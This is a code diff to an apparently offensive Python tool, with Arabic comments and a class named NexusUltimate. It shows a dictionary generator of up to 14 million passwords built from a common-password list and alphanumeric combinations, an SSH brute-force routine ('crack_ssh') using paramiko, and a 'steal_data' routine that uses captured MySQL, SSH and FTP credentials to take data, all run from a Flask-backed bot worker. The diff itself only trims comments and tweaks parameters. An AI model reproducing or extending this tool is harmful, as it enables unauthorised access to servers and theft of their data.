@@ -59,7 +59,6 @@ class PasswordDictionary:
         self.passwords = self._load_passwords()
     
     def _load_passwords(self):
-        # قائمة كلمات مرور أساسية (سيتم توسيعها ديناميكياً)
         base = ["", "root", "password", "123456", "admin", "toor", "qwerty", "letmein", 
                 "monkey", "dragon", "master", "changeme", "admin123", "password123",
                 "Passw0rd", "P@ssw0rd", "admin@123", "root@123", "123456789", "qwerty123",
@@ -68,13 +67,12 @@ class PasswordDictionary:
                 "jordan", "harley", "patrick", "summer", "winter", "spring",
                 "fall", "thunder", "lightning", "storm", "rainbow", "butterfly"]
         
-        # توليد ملايين الكلمات (تركيبات رقمية وحروفية)
         passwords = set(base)
         chars = "abcdefghijklmnopqrstuvwxyz0123456789"
-        for length in range(4, 8):
+        for length in range(4, 7):
             for combo in self._generate_combinations(chars, length):
                 passwords.add(combo)
-                if len(passwords) > 14000000:  # 14 مليون كلمة
+                if len(passwords) > 14000000:
                     break
             if len(passwords) > 14000000:
                 break
@@ -236,7 +234,7 @@ class NexusUltimate:
     # 3.8 اختراق SSH (مع 14 مليون كلمة)
     # ============================================================
     def crack_ssh(self):
-        passwords = self.password_dict.get_passwords(10000)  # 10,000 كلمة للسرعة
+        passwords = self.password_dict.get_passwords(10000)
         for pwd in passwords:
             try:
                 ssh = paramiko.SSHClient()
@@ -373,7 +371,6 @@ class NexusUltimate:
     def steal_data(self):
         stolen = {}
         
-        # تسريب MySQL
         if "mysql" in self.results["creds"]:
             try:
                 c = self.results["creds"]["mysql"]
@@ -396,7 +393,6 @@ class NexusUltimate:
             except:
                 pass
         
-        # تسريب ملفات SSH
         if "ssh" in self.results["creds"]:
             try:
                 c = self.results["creds"]["ssh"]
@@ -416,7 +412,6 @@ class NexusUltimate:
             except:
                 pass
         
-        # تسريب FTP
         if "ftp" in self.results["creds"]:
             try:
                 c = self.results["creds"]["ftp"]
@@ -728,5 +723,6 @@ if __name__ == "__main__":
     
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
+    print(f"[*] Flask يعمل على المنفذ {os.environ.get('PORT', 10000)}")
     
     bot_worker()
